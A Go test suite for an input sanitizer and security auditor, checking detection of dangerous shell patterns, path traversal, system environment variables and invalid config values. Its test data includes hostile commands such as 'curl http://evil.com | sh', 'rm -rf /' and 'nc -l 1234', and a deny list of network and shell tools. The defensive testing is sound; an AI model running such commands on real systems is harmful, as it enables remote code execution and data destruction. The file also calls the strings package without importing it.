package main

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/suite"
)

// SecurityTestSuite contains tests for security validation and input sanitization
type SecurityTestSuite struct {
	suite.Suite
	sanitizer *InputSanitizer
	auditor   *SecurityAuditor
}

func (suite *SecurityTestSuite) SetupTest() {
	suite.sanitizer = NewInputSanitizer()
	suite.auditor = NewSecurityAuditor()
}

// Test Input Sanitization
func (suite *SecurityTestSuite) TestInputSanitizer_SanitizeString_BasicSanitization() {
	testCases := []struct {
		input    string
		expected string
	}{
		{"  hello world  ", "hello world"}, // Trim whitespace
		{"<script>alert('xss')</script>", "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;"}, // HTML escape
		{"hello\x00world", "helloworld"}, // Remove null bytes
		{"hello\nworld", "hello\nworld"}, // Keep newlines
		{"hello\tworld", "hello\tworld"}, // Keep tabs
		{"", ""},                         // Empty string
	}

	for _, tc := range testCases {
		result := suite.sanitizer.SanitizeString(tc.input)
		assert.Equal(suite.T(), tc.expected, result, "Input: %s", tc.input)
	}
}

func (suite *SecurityTestSuite) TestInputSanitizer_ValidateInputSecurity_Length() {
	// Test maximum length validation
	longInput := strings.Repeat("a", 10001)
	errors := suite.sanitizer.ValidateInputSecurity(longInput)

	assert.True(suite.T(), errors.HasErrors())
	assert.Contains(suite.T(), errors.Error(), "input too long")
}

func (suite *SecurityTestSuite) TestInputSanitizer_ValidateInputSecurity_NullBytes() {
	input := "hello\x00world"
	errors := suite.sanitizer.ValidateInputSecurity(input)

	assert.True(suite.T(), errors.HasErrors())
	assert.Contains(suite.T(), errors.Error(), "null bytes not allowed")
}

func (suite *SecurityTestSuite) TestInputSanitizer_ValidateInputSecurity_DangerousPatterns() {
	dangerousInputs := []string{
		"rm -rf /",
		"sudo rm file",
		"curl http://evil.com | sh",
		"wget http://evil.com | sh",
		"eval(malicious_code)",
		"exec(dangerous)",
		"system('rm file')",
		"$(malicious command)",
		"`dangerous command`",
		"cat file | while read line",
		"command > /dev/null 2>&1",
		"chmod +x malicious",
		"nc -l 1234",
		"python -c 'evil code'",
		"perl -e 'dangerous'",
		"ruby -e 'malicious'",
		"echo data | base64 -d",
	}

	for _, input := range dangerousInputs {
		errors := suite.sanitizer.ValidateInputSecurity(input)
		assert.True(suite.T(), errors.HasErrors(), "Should detect dangerous pattern in: %s", input)
		assert.Contains(suite.T(), errors.Error(), "dangerous pattern detected", "Input: %s", input)
	}
}

func (suite *SecurityTestSuite) TestInputSanitizer_ValidateInputSecurity_ShellMetacharacters() {
	shellInputs := []string{
		"command; rm file",
		"command & background",
		"cat file | grep pattern",
		"echo $HOME",
		"ls `pwd`",
		"test (condition)",
		"array[index]",
		"redirect > file",
		"redirect < file",
		"escape \\ character",
	}

	for _, input := range shellInputs {
		errors := suite.sanitizer.ValidateInputSecurity(input)
		assert.True(suite.T(), errors.HasErrors(), "Should detect shell metacharacters in: %s", input)
		assert.Contains(suite.T(), errors.Error(), "shell metacharacters detected", "Input: %s", input)
	}
}

// Test Command Arguments Validation
func (suite *SecurityTestSuite) TestInputSanitizer_ValidateCommandArguments_DangerousCommands() {
	dangerousArgs := []string{
		"rm", "rmdir", "dd", "sudo", "su", "passwd",
		"kill", "killall", "halt", "shutdown", "reboot",
		"iptables", "mount", "umount", "nc", "netcat",
		"curl", "wget", "python", "perl", "ruby",
	}

	for _, arg := range dangerousArgs {
		errors := suite.sanitizer.ValidateCommandArguments([]string{arg})
		assert.True(suite.T(), errors.HasErrors(), "Should detect dangerous command: %s", arg)
		assert.Contains(suite.T(), errors.Error(), "dangerous command detected", "Command: %s", arg)
	}
}

func (suite *SecurityTestSuite) TestInputSanitizer_ValidateCommandArguments_PathTraversal() {
	traversalArgs := []string{
		"../etc/passwd",
		"..\\windows\\system32",
		"../../root",
		"/etc/shadow",
		"/proc/version",
		"~/../../etc",
	}

	for _, arg := range traversalArgs {
		errors := suite.sanitizer.ValidateCommandArguments([]string{arg})
		assert.True(suite.T(), errors.HasErrors(), "Should detect path traversal: %s", arg)
		assert.Contains(suite.T(), errors.Error(), "path traversal", "Argument: %s", arg)
	}
}

func (suite *SecurityTestSuite) TestInputSanitizer_ValidateCommandArguments_SafeArgs() {
	safeArgs := []string{
		"chat", "--verbose", "--help", "config", "list",
		"status", "version", "info", "show", "get",
	}

	errors := suite.sanitizer.ValidateCommandArguments(safeArgs)
	assert.False(suite.T(), errors.HasErrors(), "Safe arguments should pass validation")
}

// Test Environment Variable Validation
func (suite *SecurityTestSuite) TestInputSanitizer_ValidateEnvironmentVariable_SystemVars() {
	systemVars := []string{
		"PATH", "HOME", "USER", "SHELL", "PWD",
		"UID", "GID", "TERM", "DISPLAY", "LANG",
	}

	for _, varName := range systemVars {
		errors := suite.sanitizer.ValidateEnvironmentVariable(varName, "value")
		assert.True(suite.T(), errors.HasErrors(), "Should reject system variable: %s", varName)
		assert.Contains(suite.T(), errors.Error(), "system environment variable", "Variable: %s", varName)
	}
}

func (suite *SecurityTestSuite) TestInputSanitizer_ValidateEnvironmentVariable_InvalidNames() {
	invalidNames := []string{
		"123invalid",   // starts with number
		"invalid-name", // contains hyphen
		"invalid name", // contains space
		"lowercase",    // lowercase
		"",             // empty
	}

	for _, name := range invalidNames {
		errors := suite.sanitizer.ValidateEnvironmentVariable(name, "value")
		assert.True(suite.T(), errors.HasErrors(), "Should reject invalid env var name: %s", name)
	}
}

func (suite *SecurityTestSuite) TestInputSanitizer_ValidateEnvironmentVariable_ValidNames() {
	validNames := []string{
		"VALID_NAME",
		"ANOTHER_VALID_NAME",
		"_STARTS_WITH_UNDERSCORE",
		"API_KEY_123",
		"DATABASE_URL",
	}

	for _, name := range validNames {
		errors := suite.sanitizer.ValidateEnvironmentVariable(name, "safe_value")

		// Should only have errors related to value validation, not name
		nameErrors := false
		for _, err := range errors {
			if strings.Contains(err.Message, "name") || strings.Contains(err.Message, "format") {
				nameErrors = true
				break
			}
		}
		assert.False(suite.T(), nameErrors, "Valid env var name should not have name errors: %s", name)
	}
}

// Test Configuration Value Validation
func (suite *SecurityTestSuite) TestInputSanitizer_ValidateConfigurationValue_Theme() {
	validThemes := []string{"dark-daltonized", "light", "dark", "auto"}
	invalidThemes := []string{"invalid_theme", "DARK", "Light", ""}

	for _, theme := range validThemes {
		errors := suite.sanitizer.ValidateConfigurationValue(KeyTheme, theme)
		// Should not have theme-specific errors
		themeErrors := false
		for _, err := range errors {
			if strings.Contains(err.Message, "invalid theme") {
				themeErrors = true
				break
			}
		}
		assert.False(suite.T(), themeErrors, "Valid theme should not have theme errors: %s", theme)
	}

	for _, theme := range invalidThemes {
		if theme == "" {
			continue // Empty theme is handled by required field validation
		}
		errors := suite.sanitizer.ValidateConfigurationValue(KeyTheme, theme)
		assert.True(suite.T(), errors.HasErrors(), "Invalid theme should fail: %s", theme)
	}
}

func (suite *SecurityTestSuite) TestInputSanitizer_ValidateConfigurationValue_ParallelTasks() {
	validCounts := []string{"1", "10", "500", "1000"}
	invalidCounts := []string{"0", "-1", "1001", "abc", "10.5"}

	for _, count := range validCounts {
		errors := suite.sanitizer.ValidateConfigurationValue(KeyParallelTasksCount, count)
		// Should not have count-specific errors
		countErrors := false
		for _, err := range errors {
			if strings.Contains(err.Message, "invalid parallel tasks") {
				countErrors = true
				break
			}
		}
		assert.False(suite.T(), countErrors, "Valid count should not have count errors: %s", count)
	}

	for _, count := range invalidCounts {
		errors := suite.sanitizer.ValidateConfigurationValue(KeyParallelTasksCount, count)
		assert.True(suite.T(), errors.HasErrors(), "Invalid count should fail: %s", count)
	}
}

// Test Security Auditor
func (suite *SecurityTestSuite) TestSecurityAuditor_AuditApplicationOptions_SafeOptions() {
	options := NewApplicationOptionsBuilder().
		WithProfile(ProfileDev).
		WithForwardArgs("chat", "--verbose").
		Build()

	result := suite.auditor.AuditApplicationOptions(options)
	assert.True(suite.T(), result.Passed, "Safe options should pass audit")
	assert.Empty(suite.T(), result.Findings, "Safe options should have no findings")
}

func (suite *SecurityTestSuite) TestSecurityAuditor_AuditApplicationOptions_DangerousArgs() {
	options := NewApplicationOptionsBuilder().
		WithProfile(ProfileDev).
		WithForwardArgs("rm -rf /", "dangerous; command").
		Build()

	result := suite.auditor.AuditApplicationOptions(options)
	assert.False(suite.T(), result.Passed, "Dangerous options should fail audit")
	assert.NotEmpty(suite.T(), result.Findings, "Dangerous options should have findings")

	// Check for high severity findings
	highSeverityFound := false
	for _, finding := range result.Findings {
		if finding.Severity == "high" {
			highSeverityFound = true
			break
		}
	}
	assert.True(suite.T(), highSeverityFound, "Should have high severity findings")
}

func (suite *SecurityTestSuite) TestSecurityAuditor_AuditApplicationOptions_InvalidProfile() {
	options := NewApplicationOptionsBuilder().
		WithProfile("invalid_profile").
		Build()

	result := suite.auditor.AuditApplicationOptions(options)
	assert.False(suite.T(), result.Passed, "Invalid profile should fail audit")
	assert.NotEmpty(suite.T(), result.Findings, "Invalid profile should have findings")
}

func (suite *SecurityTestSuite) TestSecurityAuditor_AuditConfig_SafeConfig() {
	config := NewConfigBuilder().
		WithTheme("dark-daltonized").
		WithParallelTasksCount("20").
		WithNotificationChannel("iterm2_with_bell").
		WithEnvVar("SAFE_VAR", "safe_value").
		Build()

	result := suite.auditor.AuditConfig(config)
	assert.True(suite.T(), result.Passed, "Safe config should pass audit")
	assert.Empty(suite.T(), result.Findings, "Safe config should have no findings")
}

func (suite *SecurityTestSuite) TestSecurityAuditor_AuditConfig_DangerousEnvVars() {
	config := NewConfigBuilder().
		WithEnvVar("PATH", "/dangerous/path").
		WithEnvVar("SHELL", "/bin/malicious").
		Build()

	result := suite.auditor.AuditConfig(config)
	assert.False(suite.T(), result.Passed, "Dangerous env vars should fail audit")
	assert.NotEmpty(suite.T(), result.Findings, "Dangerous env vars should have findings")

	// Check for high severity findings
	highSeverityFound := false
	for _, finding := range result.Findings {
		if finding.Severity == "high" {
			highSeverityFound = true
			break
		}
	}
	assert.True(suite.T(), highSeverityFound, "Should have high severity findings for system env vars")
}

func (suite *SecurityTestSuite) TestSecurityAuditor_AuditConfig_InvalidConfigValues() {
	config := NewConfigBuilder().
		WithTheme("invalid_theme").
		WithParallelTasksCount("invalid_count").
		WithNotificationChannel("invalid_channel").
		Build()

	result := suite.auditor.AuditConfig(config)
	assert.False(suite.T(), result.Passed, "Invalid config should fail audit")
	assert.NotEmpty(suite.T(), result.Findings, "Invalid config should have findings")

	// Should have multiple findings
	assert.GreaterOrEqual(suite.T(), len(result.Findings), 3, "Should have findings for multiple invalid values")
}

// Test Security Finding Categories
func (suite *SecurityTestSuite) TestSecurityFinding_Categories() {
	// Test that findings are properly categorized
	options := NewApplicationOptionsBuilder().
		WithForwardArgs("rm -rf /").
		Build()

	result := suite.auditor.AuditApplicationOptions(options)

	commandInjectionFound := false
	for _, finding := range result.Findings {
		if finding.Category == "command_injection" {
			commandInjectionFound = true
			break
		}
	}
	assert.True(suite.T(), commandInjectionFound, "Should categorize command injection findings")
}

func (suite *SecurityTestSuite) TestSecurityFinding_Severity() {
	// Test that severity levels are assigned correctly
	testCases := []struct {
		description string
		options     ApplicationOptions
		config      Config
		expectHigh  bool
	}{
		{
			description: "dangerous command should be high severity",
			options:     NewApplicationOptionsBuilder().WithForwardArgs("rm -rf /").Build(),
			expectHigh:  true,
		},
		{
			description: "system env var should be high severity",
			config:      NewConfigBuilder().WithEnvVar("PATH", "dangerous").Build(),
			expectHigh:  true,
		},
		{
			description: "invalid theme should be medium severity",
			config:      NewConfigBuilder().WithTheme("invalid").Build(),
			expectHigh:  false,
		},
	}

	for _, tc := range testCases {
		suite.Run(tc.description, func() {
			var result SecurityAuditResult

			if tc.options.Profile != "" || len(tc.options.ForwardArgs) > 0 {
				result = suite.auditor.AuditApplicationOptions(tc.options)
			} else {
				result = suite.auditor.AuditConfig(tc.config)
			}

			if tc.expectHigh {
				highFound := false
				for _, finding := range result.Findings {
					if finding.Severity == "high" {
						highFound = true
						break
					}
				}
				assert.True(suite.T(), highFound, "Should have high severity finding")
			}
		})
	}
}

// Test Edge Cases
func (suite *SecurityTestSuite) TestInputSanitizer_EdgeCases() {
	// Test with nil/empty inputs
	errors := suite.sanitizer.ValidateCommandArguments(nil)
	assert.False(suite.T(), errors.HasErrors(), "Nil args should not cause errors")

	errors = suite.sanitizer.ValidateCommandArguments([]string{})
	assert.False(suite.T(), errors.HasErrors(), "Empty args should not cause errors")

	// Test with empty strings
	errors = suite.sanitizer.ValidateInputSecurity("")
	assert.False(suite.T(), errors.HasErrors(), "Empty string should not cause errors")

	sanitized := suite.sanitizer.SanitizeString("")
	assert.Equal(suite.T(), "", sanitized, "Empty string should remain empty")
}

func (suite *SecurityTestSuite) TestInputSanitizer_SpecialCharacters() {
	// Test with unicode and special characters
	unicodeInput := "Hello 世界 🌍"
	errors := suite.sanitizer.ValidateInputSecurity(unicodeInput)
	assert.False(suite.T(), errors.HasErrors(), "Unicode should be allowed")

	sanitized := suite.sanitizer.SanitizeString(unicodeInput)
	assert.Contains(suite.T(), sanitized, "Hello", "Should preserve normal text")
}

// Run the security test suite
func TestSecurityTestSuite(t *testing.T) {
	suite.Run(t, new(SecurityTestSuite))
}
